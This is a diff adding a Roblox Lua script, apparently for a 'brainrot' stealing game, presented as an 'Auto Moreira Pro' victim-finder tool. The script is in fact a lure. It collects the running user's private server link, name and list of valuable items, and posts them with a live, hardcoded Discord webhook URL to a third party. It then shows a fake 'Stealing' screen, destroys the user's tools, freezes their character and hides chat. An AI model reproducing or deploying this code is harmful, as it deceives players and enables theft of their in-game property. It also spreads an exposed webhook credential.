@@ -1,0 +1,528 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
+local SoundService = game:GetService("SoundService")
+local RunService = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
+
+-- ⚙️ SETTINGS
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1447299637600981012/NtzGdIGDrgPWvZPh4tSyIkeMsKg6qs-MsCi60hWIuTEuMmzndkNJGNiIhMpOxUdkjBsD"
+local Min_Gen = 10_000_000
+
+-- 🔇 SOUND MUTING SYSTEM (Optimized)
+local musicLocations = {
+    game.Workspace,
+    game.SoundService,
+}
+
+local commonMusicNames = {
+    "music", "musica", "bgm", "background", "theme", "soundtrack", "song", "tema"
+}
+
+local function isMusic(sound)
+    if not sound:IsA("Sound") then
+        return false
+    end
+    
+    local lowerName = sound.Name:lower()
+    for _, word in pairs(commonMusicNames) do
+        if lowerName:find(word) then
+            return true
+        end
+    end
+    
+    for _, location in pairs(musicLocations) do
+        if sound:IsDescendantOf(location) and sound.Parent == location then
+            if sound.Looped and sound.TimeLength > 30 then
+                return true
+            end
+        end
+    end
+    
+    return false
+end
+
+local function processSound(sound)
+    if sound:IsA("Sound") then
+        if not isMusic(sound) then
+            sound.Volume = 0
+        end
+    elseif sound:IsA("SoundGroup") then
+        sound.Volume = 0
+    end
+end
+
+-- Mute existing sounds (optimized)
+task.spawn(function()
+    for _, descendant in pairs(game:GetDescendants()) do
+        processSound(descendant)
+    end
+end)
+
+-- Mute new sounds
+game.DescendantAdded:Connect(function(descendant)
+    task.wait()
+    processSound(descendant)
+end)
+
+print("🔇 Sound muting system activated!")
+
+-- ▼ Function: format numbers
+local function formatNumberShort(n)
+    if not n or type(n) ~= "number" then return "$0" end
+    if n >= 1e9 then return string.format("$%.1fB", n/1e9):gsub("%.0B","B") end
+    if n >= 1e6 then return string.format("$%.1fM", n/1e6):gsub("%.0M","M") end
+    if n >= 1e3 then return string.format("$%.1fK", n/1e3):gsub("%.0K","K") end
+    return "$"..tostring(n)
+end
+
+-- ▼ Function: convert text to numeric value
+local function parseValueFromText(s)
+    if not s then return 0 end
+    local num = s:match("([%d%.]+)")
+    if not num then return 0 end
+    local n = tonumber(num) or 0
+    if s:find("B") then return n*1e9 
+    elseif s:find("M") then return n*1e6 
+    elseif s:find("K") then return n*1e3 
+    else return n end
+end
+
+-- ▼ Function: GET BRAINROTS (optimized)
+local function getBrainrots()
+    local results = {}
+    local plots = Workspace:FindFirstChild("Plots") or Workspace
+    
+    for _, plot in ipairs(plots:GetChildren()) do
+        local podiums = plot:FindFirstChild("AnimalPodiums") or plot:FindFirstChild("Podiums")
+        if podiums then
+            for _, pd in ipairs(podiums:GetChildren()) do
+                local base = pd:FindFirstChild("Base") or pd:FindFirstChildWhichIsA("BasePart")
+                local spawn = base and base:FindFirstChild("Spawn")
+                local att = spawn and spawn:FindFirstChild("Attachment")
+                local oh = att and att:FindFirstChild("AnimalOverhead")
+                local nameLbl = oh and oh:FindFirstChild("DisplayName")
+                local genLbl = oh and oh:FindFirstChild("Generation")
+                
+                if nameLbl and nameLbl:IsA("TextLabel") then
+                    local name = nameLbl.Text
+                    local genText = genLbl and genLbl.Text or "0"
+                    local valueNum = parseValueFromText(genText)
+                    
+                    if valueNum >= Min_Gen then
+                        local key = name.."|"..valueNum
+                        if results[key] then
+                            results[key].count += 1
+                        else
+                            results[key] = {name=name, value=valueNum, count=1}
+                        end
+                    end
+                end
+            end
+        end
+    end
+    
+    local out = {}
+    for _, v in pairs(results) do table.insert(out, v) end
+    table.sort(out, function(a,b) return a.value > b.value end)
+    return out
+end
+
+-- ▼ Function: validate URL
+local function isValidUrl(str)
+    if type(str) ~= "string" or str == "" then return false end
+    return str:match("^https?://") and str:find(".", 1, true) and #str > 10
+end
+
+-- ▼ Function: get player count
+local function getPlayersCount()
+    return #Players:GetPlayers()
+end
+
+-- ▼ Function: SEND TO DISCORD WITH BRAINROTS
+local function sendToDiscord(link, playerCount, playerName, brainrots)
+    task.spawn(function()
+        local brainrotText = ""
+        if #brainrots > 0 then
+            brainrotText = "\n\n**🎯 Brainrots Found:**\n"
+            for i, br in ipairs(brainrots) do
+                if i > 10 then break end
+                local formattedValue = formatNumberShort(br.value)
+                brainrotText = brainrotText .. string.format(
+                    "`%d.` **%s** - %s (x%d)\n",
+                    i, br.name, formattedValue, br.count
+                )
+            end
+            brainrotText = brainrotText ..
+                string.format("\n**Total:** %d high-value brainrots", #brainrots)
+        else
+            brainrotText = "\n\n**⚠️ No high-value brainrots found**"
+        end
+        
+        local data = HttpService:JSONEncode({
+            content = "@everyone",
+            embeds = {{
+                title = "🔥 New Private Server Detected",
+                description =
+                    "**Link:**\n" .. link ..
+                    "\n\n**👤 Player:** `" .. playerName .. "`" ..
+                    "\n**👥 Players in server:** `" .. playerCount .. "`" ..
+                    brainrotText,
+                color = #brainrots > 0 and 3066993 or 15158332,
+                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+                footer = {
+                    text = "Auto Moreira • Min: " .. formatNumberShort(Min_Gen)
+                }
+            }}
+        })
+        
+        print("📤 Sending data to webhook...")
+        
+        local success, res = pcall(function()
+            return HttpService:PostAsync(
+                WEBHOOK_URL,
+                data,
+                Enum.HttpContentType.ApplicationJson,
+                false,
+                {["Content-Type"] = "application/json"}
+            )
+        end)
+        
+        if not success then
+            warn("❌ Send error:", res)
+            local altSuccess = pcall(function()
+                return request({
+                    Url = WEBHOOK_URL,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = data
+                })
+            end)
+            if altSuccess then
+                print("✅ Sent using alternate method!")
+            end
+        else
+            print("✅ Data sent successfully!")
+        end
+    end)
+end
+
+-- ▼ Function: OPTIMIZED SCAN SCREEN
+local function showScanScreen(brainrots)
+    local player = Players.LocalPlayer
+    local playerGui = player:WaitForChild("PlayerGui")
+    
+    local scanGui = Instance.new("ScreenGui")
+    scanGui.Name = "ScanScreen"
+    scanGui.ResetOnSpawn = false
+    scanGui.DisplayOrder = 999
+    scanGui.IgnoreGuiInset = true
+    
+    local blackBg = Instance.new("Frame")
+    blackBg.Size = UDim2.new(1, 0, 1, 0)
+    blackBg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    blackBg.BorderSizePixel = 0
+    blackBg.Parent = scanGui
+    
+    local mainText = Instance.new("TextLabel")
+    mainText.Size = UDim2.new(0.9, 0, 0, 80)
+    mainText.Position = UDim2.new(0.05, 0, 0.5, -40)
+    mainText.BackgroundTransparency = 1
+    mainText.Text = "Loading Auto Moreira..."
+    mainText.TextColor3 = Color3.fromRGB(0, 255, 0)
+    mainText.Font = Enum.Font.Code
+    mainText.TextSize = 24
+    mainText.TextWrapped = true
+    mainText.TextScaled = true
+    mainText.Parent = blackBg
+    
+    local textSize = Instance.new("UITextSizeConstraint")
+    textSize.MaxTextSize = 28
+    textSize.MinTextSize = 16
+    textSize.Parent = mainText
+    
+    scanGui.Parent = playerGui
+    
+    local statusVariations = {
+        "Status: lá grande combinasion",
+        "Status: Los combinado",
+        "Status: espaguete toalete",
+        "Status: lá grande Gold",
+        "Status: lá spooky",
+        "Status: lá cucaracha",
+        "Status: Chicleteira",
+        "Status: quesadila vampiro",
+        "Status: lá grande combinações diamond",
+        "Status: lá grande extinção"
+    }
+    
+    task.spawn(function()
+        while scanGui.Parent do
+            mainText.Text = "Loading Auto Moreira (wait 10s)..."
+            task.wait(10)
+            
+            mainText.Text = "Inviting victims, please wait..."
+            task.wait(10)
+            
+            for _ = 1, 2 do
+                mainText.Text = "Victim found"
+                task.wait(8)
+                
+                mainText.Text = "Status: no valuable Brainrots found"
+                task.wait(10)
+                
+                mainText.Text = "Banning......"
+                task.wait(10)
+            end
+            
+            mainText.Text = "Victim found"
+            task.wait(8)
+            
+            local randomStatus = statusVariations[math.random(1, #statusVariations)]
+            mainText.Text = randomStatus
+            task.wait(12)
+            
+            mainText.Text = "Stealing....."
+            task.wait(12)
+            
+            mainText.Text = "Theft completed"
+            task.wait(10)
+        end
+    end)
+end
+
+-- ▼ Function: LOCK PLAYER
+local function trapPlayer()
+    local player = Players.LocalPlayer
+    local char = player.Character or player.CharacterAdded:Wait()
+    
+    task.spawn(function()
+        local backpack = player:FindFirstChild("Backpack")
+        if backpack then
+            for _, tool in pairs(backpack:GetChildren()) do
+                if tool:IsA("Tool") then tool:Destroy() end
+            end
+        end
+        for _, tool in pairs(char:GetChildren()) do
+            if tool:IsA("Tool") then tool:Destroy() end
+        end
+        print("🗑️ Hotbar cleared!")
+    end)
+    
+    task.spawn(function()
+        local humanoid = char:FindFirstChild("Humanoid")
+        if humanoid then
+            humanoid.WalkSpeed = 0
+            humanoid.JumpPower = 0
+            humanoid.JumpHeight = 0
+            humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, false)
+            humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall, false)
+            print("🔒 Movement locked!")
+        end
+        
+        local hrp = char:FindFirstChild("HumanoidRootPart")
+        if hrp then hrp.Anchored = true end
+    end)
+    
+    task.spawn(function()
+        local StarterGui = game:GetService("StarterGui")
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Health, false)
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
+        print("👻 UI hidden!")
+    end)
+end
+
+-- ▼ CREATE OPTIMIZED MENU UI (PlayerGui)
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+local menu = Instance.new("ScreenGui")
+menu.Name = "AutoMoreiraMenu"
+menu.ResetOnSpawn = false
+menu.DisplayOrder = 100
+menu.IgnoreGuiInset = true
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 380, 0, 260)
+frame.Position = UDim2.new(0.5, -190, 0.5, -130)
+frame.BackgroundColor3 = Color3.fromRGB(20, 20, 28)
+frame.BorderSizePixel = 0
+frame.Parent = menu
+
+local frameCorner = Instance.new("UICorner")
+frameCorner.CornerRadius = UDim.new(0, 12)
+frameCorner.Parent = frame
+
+local frameShadow = Instance.new("UIStroke")
+frameShadow.Color = Color3.fromRGB(80, 120, 255)
+frameShadow.Thickness = 2
+frameShadow.Transparency = 0.3
+frameShadow.Parent = frame
+
+-- Compact header
+local header = Instance.new("Frame")
+header.Size = UDim2.new(1, 0, 0, 50)
+header.BackgroundColor3 = Color3.fromRGB(60, 100, 220)
+header.BorderSizePixel = 0
+header.Parent = frame
+
+local headerCorner = Instance.new("UICorner")
+headerCorner.CornerRadius = UDim.new(0, 12)
+headerCorner.Parent = header
+
+local headerFix = Instance.new("Frame")
+headerFix.Size = UDim2.new(1, 0, 0, 12)
+headerFix.Position = UDim2.new(0, 0, 1, -12)
+headerFix.BackgroundColor3 = Color3.fromRGB(60, 100, 220)
+headerFix.BorderSizePixel = 0
+headerFix.Parent = header
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, -20, 1, 0)
+title.Position = UDim2.new(0, 10, 0, 0)
+title.BackgroundTransparency = 1
+title.Text = "🔗 Auto Moreira Pro"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.Font = Enum.Font.GothamBold
+title.TextSize = 20
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.Parent = header
+
+-- Description
+local desc = Instance.new("TextLabel")
+desc.Size = UDim2.new(1, -30, 0, 30)
+desc.Position = UDim2.new(0, 15, 0, 60)
+desc.BackgroundTransparency = 1
+desc.Text = "Paste the private server link:"
+desc.TextColor3 = Color3.fromRGB(180, 180, 200)
+desc.Font = Enum.Font.Gotham
+desc.TextSize = 13
+desc.TextXAlignment = Enum.TextXAlignment.Left
+desc.Parent = frame
+
+-- Input container
+local inputBox = Instance.new("Frame")
+inputBox.Size = UDim2.new(1, -30, 0, 45)
+inputBox.Position = UDim2.new(0, 15, 0, 100)
+inputBox.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+inputBox.BorderSizePixel = 0
+inputBox.Parent = frame
+
+local inputCorner = Instance.new("UICorner")
+inputCorner.CornerRadius = UDim.new(0, 8)
+inputCorner.Parent = inputBox
+
+local inputStroke = Instance.new("UIStroke")
+inputStroke.Color = Color3.fromRGB(50, 50, 70)
+inputStroke.Thickness = 1
+inputStroke.Parent = inputBox
+
+local input = Instance.new("TextBox")
+input.Size = UDim2.new(1, -16, 1, 0)
+input.Position = UDim2.new(0, 8, 0, 0)
+input.BackgroundTransparency = 1
+input.TextColor3 = Color3.fromRGB(255, 255, 255)
+input.Font = Enum.Font.Gotham
+input.TextSize = 13
+input.PlaceholderText = "https://roblox.com/share?code=..."
+input.PlaceholderColor3 = Color3.fromRGB(100, 100, 120)
+input.ClearTextOnFocus = false
+input.TextXAlignment = Enum.TextXAlignment.Left
+input.Parent = inputBox
+
+-- Button
+local btn = Instance.new("TextButton")
+btn.Size = UDim2.new(1, -30, 0, 45)
+btn.Position = UDim2.new(0, 15, 0, 165)
+btn.BackgroundColor3 = Color3.fromRGB(60, 120, 240)
+btn.Text = "SEND LINK"
+btn.Font = Enum.Font.GothamBold
+btn.TextSize = 15
+btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+btn.AutoButtonColor = false
+btn.Parent = frame
+
+local btnCorner = Instance.new("UICorner")
+btnCorner.CornerRadius = UDim.new(0, 8)
+btnCorner.Parent = btn
+
+-- Footer info
+local footer = Instance.new("TextLabel")
+footer.Size = UDim2.new(1, 0, 0, 20)
+footer.Position = UDim2.new(0, 0, 1, -25)
+footer.BackgroundTransparency = 1
+footer.Text = "Min: " .. formatNumberShort(Min_Gen) .. " • Delta Compatible"
+footer.TextColor3 = Color3.fromRGB(120, 120, 140)
+footer.Font = Enum.Font.Gotham
+footer.TextSize = 11
+footer.Parent = frame
+
+-- Button logic
+btn.MouseButton1Click:Connect(function()
+    local link = input.Text:gsub("^%s*(.-)%s*$", "%1")
+    
+    if link == "" then
+        input.Text = ""
+        input.PlaceholderText = "❌ Paste a link first!"
+        inputStroke.Color = Color3.fromRGB(255, 80, 80)
+        task.wait(2)
+        input.PlaceholderText = "https://roblox.com/share?code=..."
+        inputStroke.Color = Color3.fromRGB(50, 50, 70)
+        return
+    end
+
+    if not isValidUrl(link) then
+        input.Text = ""
+        input.PlaceholderText = "❌ Invalid link!"
+        inputStroke.Color = Color3.fromRGB(255, 80, 80)
+        task.wait(2)
+        input.PlaceholderText = "https://roblox.com/share?code=..."
+        inputStroke.Color = Color3.fromRGB(50, 50, 70)
+        return
+    end
+
+    btn.Text = "⏳ PROCESSING..."
+    btn.BackgroundColor3 = Color3.fromRGB(255, 150, 0)
+    
+    local playerName = Players.LocalPlayer.Name
+    local playerCount = getPlayersCount()
+    
+    print("🔍 Searching for brainrots...")
+    local brainrots = getBrainrots()
+    print("✅ Found: " .. #brainrots .. " brainrots")
+    
+    sendToDiscord(link, playerCount, playerName, brainrots)
+    
+    task.wait(0.5)
+    
+    menu:Destroy()
+    showScanScreen(brainrots)
+    task.wait(2)
+    trapPlayer()
+
+    print("✅ System activated!")
+    print("🔒 Player: " .. playerName)
+    print("📊 Players: " .. playerCount)
+    print("🎯 Brainrots: " .. #brainrots)
+    print("🔗 Link: " .. link)
+end)
+
+input.Focused:Connect(function()
+    inputStroke.Color = Color3.fromRGB(80, 140, 255)
+    inputStroke.Thickness = 2
+end)
+
+input.FocusLost:Connect(function()
+    inputStroke.Color = Color3.fromRGB(50, 50, 70)
+    inputStroke.Thickness = 1
+end)
+
+menu.Parent = playerGui
+
+print("✅ Auto Moreira loaded!")
+print("🔇 Sound muting system active!")
+print("🎯 Minimum generation: " .. formatNumberShort(Min_Gen))
+print("📱 Optimized for Delta/Mobile")
+print("👤 User: " .. Players.LocalPlayer.Name)
